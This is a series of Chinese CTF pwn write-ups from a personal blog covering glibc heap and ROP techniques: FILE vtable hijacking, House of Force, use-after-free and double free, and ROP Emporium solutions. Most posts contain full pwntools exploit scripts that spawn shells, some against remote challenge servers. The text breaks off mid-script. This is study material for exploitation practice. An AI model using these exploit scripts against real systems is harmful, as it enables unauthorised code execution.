(&lt;__libc_start_main+240&gt;: mov edi,eax) # 0048| 0x7fffffffe320 --&gt; 0x1 # 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (\"/media/psf/mypwn/ahys/6/springboard/springboard\") # 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0 # 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push rbp) # 0080| 0x7fffffffe340 --&gt; 0x0 # 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42 # 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor ebp,ebp) # 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1 # 0112| 0x7fffffffe360 --&gt; 0x0 # 0120| 0x7fffffffe368 --&gt; 0x0 # 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42 # 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42 # 0144| 0x7fffffffe380 --&gt; 0x0 # 0152| 0x7fffffffe388 --&gt; 0x0 # 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830 secret考点就是IO_FILE的相关知识了，是针对伪造 vtable 劫持程序流程。 这个题估计是参考https://xz.aliyun.com/t/7205这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情） fclose 函数调用的 vtable 函数 vtable 函数 指针： /* The 'finish' function does any final cleaning up of an _IO_FILE object. It does not delete (free) it, but does everything else to finalize it. It matches the streambuf::~streambuf virtual destructor. */ typedef void (*_IO_finish_t) (FILE *, int); /* finalize */ #define _IO_FINISH(FP) JUMP1 (__finish, FP, 0) #define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0) struct _IO_jump_t &#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); &#125;; 对于攻击的vtable 函数 指针其中的： __finish__ __close 其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 __finish__就可以了。 libc2.29中的vtablevtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。 在glibc 2.23以及glibc 2.27其都是不可写的。 正是因为可以写，所以这个题难度就降低了很多。 攻击思路利用程序的最后一次任意地址写，直接把__IO_2_1_stderr的vtable上__finish__指针修改为one gadget。（这里的one gadget，需要自己多试）。 小tips第2次的2字节读入可以直接用其本来地址末2字节即可，直接在__IO_2_1_stderr的vtable不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个\\x60一个字节即可。 expfrom pwn import * import time local_file = './secret' local_libc = '/usr/lib/x86_64-linux-gnu/libc-2.29.so' remote_libc = './libc6_2.29-0ubuntu2_amd64.so' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10030) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ru(\"0x\") libc_base = int(r(12),16) - libc.symbols[\"printf\"] info_addr(\"libc_base\",libc_base) ru(\"addr\") vtable = 0x1e5758 + libc_base s(p64(vtable)) sleep(0.1) # debug() s('\\x60') sleep(0.1) rec = 0xe2386 + libc_base s(p64(0) + p64(0)+p64(rec)) itr() 由于提前就fclose(stdout),getshell以后也不会有任何的输出，所以得用exec 1&gt;&amp;2来恢复输出。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"House of Force","slug":"House of Force","date":"2020-05-13T13:30:55.952Z","updated":"2020-09-16T15:23:01.011Z","comments":true,"path":"2020/05/13/House of Force/","link":"","permalink":"http://chumen77.xyz/2020/05/13/House of Force/","excerpt":"","text":"House of Force前言基本按照这wiki上面学的，简单记录一下。 原理 使用条件 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小产生原因House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。 所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。 // 获取当前的top chunk，并计算其对应的大小 victim = av-&gt;top; size = chunksize(victim); // 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; 所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。 一般的利用办法 remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) 之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。 简单实例让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。通常应该都是打heap，因为heap的地址是相对的，不会收到地址随机化的影响。而打got的话，堆的地址是随机的，并无法确定申请多少size 大小的堆，可以攻击到got 这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下SIZE_SZ（64位是8 ，32位是4）。 让那个top chunk 指针增大来修改位于高地址空间的内容这个是较好理解的，常用修改libc上面某处的地址。 hitcon-training-bamboobox主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。 利用思路 添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。 利用 house of force 技巧，分配 chunk 至堆的基地址。 覆盖 goodbye-message 为magic 函数地址来控制程序执行流。 expfrom pwn import * import time local_file = './bamboobox' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 debug = 1 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25784) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,content): sla('choice','2') sla('item name:',str(size)) sa('item',str(content)) def free(id): sla('choice','4') sla('item',str(id)) def show(id): sla('choice','1') def edit(id,size,content): sla('choice','3') sla('item',str(id)) sla('item name',str(size)) sa('item',str(content)) context.log_level = 'debug' magic = 0x400d49 add(0x30,'chum') payload = 'a' * 0x30 +p64(0) + p64(0xffffffffffffffff) edit(0,0x40,payload) size = -(0x40 + 0x20) - 0x10 add(size,' ') payload = p64(0x400d49) + p64(0x400d49) add(0x10,payload) # sla('choice:','5') itr() gyctf-2020-forceida分析可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。 利用思路 申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。 HOF __malloc_hook + one gadget expfrom pwn import * import time local_libc = '/lib/x86_64-linux-gnu/libc.so.6' local_file = './gyctf_2020_force' remote_libc = local_libc # '../libc.so.6 debug = 0 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29457) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,date): sla('2:puts','1') sla('size',str(size)) ru('bin addr 0x') heapaddr = int(r(12),16) info_addr('heapaddr',heapaddr) sa('content',str(date)) return heapaddr payload = 0x30 * 'a' + p64(0) + p64(0xffffffffffffffff) libc_base = add(0x200000,'111') + 0x200ff0 info_addr('libc_base',libc_base) malloc_hook = libc_base + 0x3c4b10 heapaddr = add(0x30,payload) size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8 print('size----&gt;'+hex(size)) add(size,'a') rce = rce16[1] + libc_base payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols['__libc_realloc'] + realloc[1]) add(0x20,payload) sla('2:puts','1') sla('size','30') # dbg() itr() bcloud_bctf_2016这个题是一个十分精妙的题，漏洞出现在程序初始化。 strcpy是以\\x00来判断一个字符串是否结束的。在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会把这个堆块的地址也给复制上去，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。 到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去0xffffffff,就可以改到top chunk的size位。 利用思路 leak堆块base 修改top chunk size hof到heaplist处 给heaplist写上free got，用edit，修改其为puts 泄漏libc地址 修改free got 为system，然后指向/bin/sh\\x00 expfrom pwn import * from LibcSearcher import * import time local_file = './bcloud_bctf_2016' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 debug = 0 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27301) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def name(name): sa('name',str(name)) ru('b') heapbase = uu32(r(4)) - 0x8 info_addr('heapbase',heapbase) return heapbase def org(org,host): sa('Org:',str(org)) sla('Host:',str(host)) def add(size,content): sla('option---&gt;&gt;','1') sla('length',str(size)) sa('content:',str(content)) def edit(id,content): sla('---&gt;&gt;','3') sla('id',str(id)) sa('the new content',str(content)) def free(id): sla('-&gt;','4') sla('id',str(id)) context.log_level = 'debug' sizelist = 0x804B0A0 heaplist = 0x804B120 heapbase = name('a' * (0x40-1) + 'b') top = heapbase + 0xd8 info_addr('top',top) org('b'*0x40,p32(0xffffffff)) #chang top chunk size size = heaplist - top - 0x10 add(size,'\\n') add(0x18,'\\n') payload = p32(0) + p32(elf.got['free']) + p32(elf.got['atoi']) +p32(0x804B128+4+4) + '/bin/sh\\x00' edit(1,payload + '\\n') puts_plt = elf.plt['puts'] edit(1,p32(puts_plt) + '\\n') free(2) io.recv(1) io.recv(1) atoi = uu32(r(4)) info_addr('atoi',atoi) libc = LibcSearcher('atoi',atoi) libc_base = atoi - libc.dump('atoi') system = libc_base + libc.dump('system') info_addr('libc_base',libc_base) edit(1,p32(system) + '\\n') free(3) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"House系列","slug":"House系列","permalink":"http://chumen77.xyz/tags/House系列/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"DASCTF安恒月赛(4th)","slug":"DASCTF安恒月赛","date":"2020-04-25T13:48:11.966Z","updated":"2020-10-20T02:06:34.671Z","comments":true,"path":"2020/04/25/DASCTF安恒月赛/","link":"","permalink":"http://chumen77.xyz/2020/04/25/DASCTF安恒月赛/","excerpt":"","text":"DASCTF安恒月赛-pwn前言开赛了，有点事情没打，晚上复现了一下。 echo-server[*] '/ctf/work/ahys/echo server/test' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 程序很简单，经典栈溢出，rop利用即可。但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，调试发现：发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。解决办法：还是加个ret，让栈对其即可。 expfrom pwn import * local_file = './test' local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' remote_libc = './libc.so.6' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: # io = remote('node3.buuoj.cn',25390) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() pop_rdi = 0x0000000000400823# : pop rdi ; ret offset = 136 start = 0x4005C0 ret = 0x0400768 sla('how long is your name:','500') payload = '\\x00' * offset + flat([ret,pop_rdi,elf.got['read'],elf.plt['printf'],start]) # dbg() sla('s you name?',payload) ru('hello ') read = uu64(r(6)) info_addr('printf',read) libc_base = read - libc.symbols['read'] info_addr('libc_base',libc_base) binsh = libc_base + libc.search(\"/bin/sh\").next() system = libc_base + libc.sym['system'] sla('how long is your name: ','500') payload = '\\x00' * offset + flat([ret,pop_rdi,binsh,system]) # rec = 0x4f322 + libc_base # dbg() sla('s you name?',payload) itr() 入门reverses = 'akhb~chdaZrdaZudqduvdZvvv|' flag = '' for i in range(26): flag += chr((ord(s[i]) - 1) ^ 6) print(flag) Encrypts直接爆破了。 s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61] for i in range(128): flag = '' for j in range(38): flag += chr(s[j] ^ i) if flag[:4] == 'flag': print(flag)","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"rop","slug":"rop","permalink":"http://chumen77.xyz/tags/rop/"},{"name":"uaf","slug":"uaf","permalink":"http://chumen77.xyz/tags/uaf/"}]},{"title":"uaf和double free","slug":"uaf和double free","date":"2020-04-25T03:40:09.709Z","updated":"2020-06-27T16:24:30.624Z","comments":true,"path":"2020/04/25/uaf和double free/","link":"","permalink":"http://chumen77.xyz/2020/04/25/uaf和double free/","excerpt":"","text":"uaf和double free前言最近开始打算入门堆，简单记录几道相关的题。 hitcontraining-uaf题目较为简单存在后门函数，利用uaf漏洞攻击即可。 expfrom pwn import * local_file = './hacknote' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27892) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(size,content): sl('1') ru('Note size ') sl(str(size)) ru('Content :') sl(str(content)) def dele(index): sl('2') sl(str(index)) def show(index): sl('3') sl(str(index)) ru('Your choice :') add(16,'aaaa') ru('Your choice :') add(16,'bbbb') ru('Your choice :') dele(0) ru('Your choice :') dele(1) ru('Your choice :') add(8,p32(elf.symbols['magic'])) ru('Your choice :') show(0) itr() ACTF_2019_babyheap题目有system函数，并且也有/bin/sh\\x00 ，当时在构造这个/bin/sh\\x00的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。 expfrom pwn import * local_file = './ACTF_2019_babyheap' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27341) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(size,content): sla('Your choice: ','1') sla('size: \\n',str(size)) sa('content: \\n',str(content)) def dele(index): sla(': ','2') sla('index: \\n',str(index)) def show(index): sla(': ','3') sla('index: \\n',str(index)) add(32,'aaaaaaaa') #0 add(32,'bbbbbbbb') #1 dele(0) dele(1) binsh = 0x602010 add(16,flat(binsh,elf.plt['system'])) # dbg() show(0) itr() actf-2019-messageDouble free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。改__free_hook为system即可。__free_hook的参数正好是堆块的date，较好控制。（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。） expfrom pwn import * local_file = './ACTF_2019_message' # local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' # remote_libc = local_libc # '../libc.so.6' debug = 1 if debug: io = process(local_file) # libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25390) # libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(length,contend) : sla('choice: ','1') sla('length of message:\\n',str(length)) sa('message:\\n',str(contend)) def free(index): sla('choice: ','2') sla('to delete:\\n',str(index)) def edit(index,contend): sla('choice: ','3') sla('to edit:\\n',str(index)) sa('the message:\\n',str(contend)) def show(index): sla('choice: ','4') sla('to display:\\n',str(index)) add(0x30,'a') #0 add(0x20,'a') #1 add(0x20,'a') #2 free(1) free(2) free(1) add(0x20,p64(0x602068)) add(0x20,'aaaaaaaa') add(0x20,'aaaaaaaa') contend = p64(elf.got['puts'])# + p64(0x30) + p64(elf.got['puts']) add(0x20,contend) show(0) ru(' message: ') puts = uu64(r(6)) libc_base = puts - libc.symbols['puts'] free_hook = libc_base + libc.symbols['__free_hook'] print('puts' + hex(puts)) print('libc_base' + hex(libc_base)) system = libc_base + libc.symbols['system'] contend = p64(free_hook) dbg() edit(6,contend) # dbg() contend = p64(system) edit(0,contend) # dbg() add(0x8,'/bin/sh\\x00') free(7) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"pwntools的gdb.attach","slug":"pwntools的gdb.attach","date":"2020-04-20T04:21:15.070Z","updated":"2020-07-16T13:15:04.024Z","comments":true,"path":"2020/04/20/pwntools的gdb.attach/","link":"","permalink":"http://chumen77.xyz/2020/04/20/pwntools的gdb.attach/","excerpt":"","text":"pwntools的gdb.attach前言最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。自己手动gdb.attach上去。然后发现谷歌也谷歌不出来，就来折腾源码了。版本号 ：pwntools (4.0.1) 改善因为正常本人都是 chumen77@chumen-77:~$ gdb at pid 这样来进行attach。发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。 找关键处/running in new terminal 删除2行和修改一行代码（-q 改成 at）即可。 发现已经可以了。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"Ropemporium 通关记录","slug":"Ropemporium通关记录","date":"2020-04-13T04:32:06.614Z","updated":"2020-08-02T15:30:06.189Z","comments":true,"path":"2020/04/13/Ropemporium通关记录/","link":"","permalink":"http://chumen77.xyz/2020/04/13/Ropemporium通关记录/","excerpt":"","text":"Ropemporium 通关记录ret2win保护和archArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。 int ret2win() &#123; printf(\"Thank you! Here's your flag:\"); return system(\"/bin/cat flag.txt\"); &#125; 并且存在漏洞函数。 exp32位from pwn import * context.arch = 'i386' io = process('./ret2win32') io.recvuntil('&gt;') payload = 'a' * 44 + p32(0x08048659) io.sendline(payload) io.interactive() 64位from pwn import * context.arch = 'amd64' io = process('./ret2win') io.recvuntil('&gt;') payload = 'a' * 40 + p64(0x00000400811) io.sendline(payload) io.interactive() split保护和archArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析int usefulFunction() &#123; return system(\"/bin/ls\"); &#125; 后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。 exp32位：from pwn import * context.arch = 'i386' io = process('./split32') key = 0x0804A030 # /bin/cat flag.txt' io.recvuntil('&gt;') offset = 44 payload = 'a' * offset + p32(0x08048657) + p32(0x0804A030) raw_input('-&gt;') io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' io = process('./split') io.recvuntil('&gt;') key = 0x00601060 # /bin/cat flag.txt' offset = 40 pop_rdi_ret = 0x0000000000400883 payload = 'a' * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload) io.interactive() callmeida分析void __noreturn usefulFunction() &#123; callme_three(4LL, 5LL, 6LL); callme_two(4LL, 5LL, 6LL); callme_one(4LL, 5LL, 6LL); exit(1); &#125; 这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。 找到以后发现应该是按照顺序调用callme-one，callme-two，callme-three需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。 exp32位：from pwn import * context.arch = 'i386' io = process('./callme32') io.recvuntil('&gt;') offset = 44 callme_one = 0x080485C0 callme_two = 0x08048620 callme_three = 0x080485B0 pop3_ret = 0x080488a9 payload = 'a' * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3) raw_input('-&gt;') io.sendline(payload) io.interactive() 其中pop3_ret 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是call所以在填的时候，应该是填充其plt的地址。 64位：from pwn import * context.arch = 'amd64' io = process('./callme') io.recvuntil('&gt;') offset = 40 callme_one = 0x00401850 callme_two = 0x000401870 callme_three = 0x00401810 pop3_ret = 0x0000000000401ab0 payload = 'a' * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three) raw_input('-&gt;') io.sendline(payload) io.interactive() 利用 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret这个gadget来控制参数。 write4ida分析这个题跟前面第2题很像，但是就是没有给你cat flag 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把/bin/sh往bss段上写,然后接着拿shell就好了。 ROPgadget --binary ./write4 --only \"mov|pop|ret\" 查好用的gadgets：利用这即可就可以了，32位的类似。 exp32位：from pwn import * context.arch = 'i386' io = process('./write432') io.recvuntil('&gt;') elf = ELF('./write432') # bin_sh = elf.search('/bin/cat').next() offset = 44 bss = 0x804A06C-0x10 pop_edi_pop_ebp_ret = 0x080486da system = 0x8048430 key = 0x08048670 #mov dword ptr [edi], ebp ; ret payload = 'a' * offset + flat([pop_edi_pop_ebp_ret,bss,'sh\\x00\\x00',key,system,0xdeadbeef,bss]) raw_input('-&gt;') io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' io = process('./write4') io.recvuntil('&gt;') elf = ELF('./write4') # bin_sh = elf.search('/bin/cat').next() offset = 40 bss = 